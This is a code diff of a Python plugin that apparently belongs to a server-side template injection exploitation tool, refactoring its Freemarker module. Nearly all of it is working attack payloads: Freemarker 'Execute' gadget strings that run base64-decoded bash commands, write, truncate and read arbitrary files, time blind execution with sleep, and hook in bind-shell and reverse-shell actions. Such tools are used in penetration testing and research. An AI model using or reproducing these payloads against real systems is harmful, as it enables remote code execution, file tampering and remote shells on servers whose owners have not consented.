@@ -6,76 +6,78 @@ from core import languages
 import re
 
 class Freemarker(Plugin):
+    
+    def init(self):
 
-    actions = {
-        'render' : {
-            'render': '${%(code)s}',
-            'header': '${%(header)s?c}',
-            'trailer': '${%(trailer)s?c}',
-            'render_test': """%(r1)s}<#--%(comment)s-->${%(r2)s""" % { 
-                'r1' : rand.randints[0],
-                'comment' : rand.randints[1],
-                'r2' : rand.randints[2]
+        self.update_actions({
+            'render' : {
+                'render': '${%(code)s}',
+                'header': '${%(header)s?c}',
+                'trailer': '${%(trailer)s?c}',
+                'render_test': """%(r1)s}<#--%(comment)s-->${%(r2)s""" % { 
+                    'r1' : rand.randints[0],
+                    'comment' : rand.randints[1],
+                    'r2' : rand.randints[2]
+                },
+                'render_expected': '%(r1)s%(r2)s' % { 
+                    'r1' : rand.randints[0],
+                    'r2' : rand.randints[2]
+                }
             },
-            'render_expected': '%(r1)s%(r2)s' % { 
-                'r1' : rand.randints[0],
-                'r2' : rand.randints[2]
+            'write' : {
+                'call' : 'inject',
+                'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
+                'truncate' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {echo,-n,}>%(path)s") }""",
+            },
+            'read' : {
+                'call': 'execute',
+                'read' : """base64<'%(path)s'"""
+            },
+            'md5' : {
+                'call': 'execute',
+                'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
+            },
+            # Prepared to used only for blind detection. Not useful for time-boolean
+            # tests (since && characters can\'t be used) but enough for the detection phase.
+            'blind' : {
+                'call': 'execute_blind',
+                'bool_true' : 'true',
+                'bool_false' : 'false'
+            },
+            # Not using execute here since it's rendered and requires set headers and trailers
+            'execute_blind' : {
+                'call': 'inject',
+                'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}") }"""
+            },
+            'execute' : {
+                'call': 'render',
+                'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}") }"""
+            },
+            'bind_shell' : {
+                'call' : 'execute_blind',
+                'bind_shell': languages.bash_bind_shell
+            },
+            'reverse_shell' : {
+                'call': 'execute_blind',
+                'reverse_shell' : languages.bash_reverse_shell
             }
-        },
-        'write' : {
-            'call' : 'inject',
-            'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
-            'truncate' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {echo,-n,}>%(path)s") }""",
-        },
-        'read' : {
-            'call': 'execute',
-            'read' : """base64<'%(path)s'"""
-        },
-        'md5' : {
-            'call': 'execute',
-            'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
-        },
-        # Prepared to used only for blind detection. Not useful for time-boolean
-        # tests (since && characters can\'t be used) but enough for the detection phase.
-        'blind' : {
-            'call': 'execute_blind',
-            'bool_true' : 'true',
-            'bool_false' : 'false'
-        },
-        # Not using execute here since it's rendered and requires set headers and trailers
-        'execute_blind' : {
-            'call': 'inject',
-            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}") }"""
-        },
-        'execute' : {
-            'call': 'render',
-            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}") }"""
-        },
-        'bind_shell' : {
-            'call' : 'execute_blind',
-            'bind_shell': languages.bash_bind_shell
-        },
-        'reverse_shell' : {
-            'call': 'execute_blind',
-            'reverse_shell' : languages.bash_reverse_shell
-        }
 
-    }
+        })
 
 
-    contexts = [
+        self.set_contexts([
 
 
-        # Text context, no closures
-        { 'level': 0 },
+            # Text context, no closures
+            { 'level': 0 },
 
-        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : languages.java_ctx_closures },
+            { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : languages.java_ctx_closures },
 
-        # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
-        { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
-        { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
-        { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
-    ]
+            # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
+            { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
+            { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
+            { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
+        ])
 
 
     language = 'java'
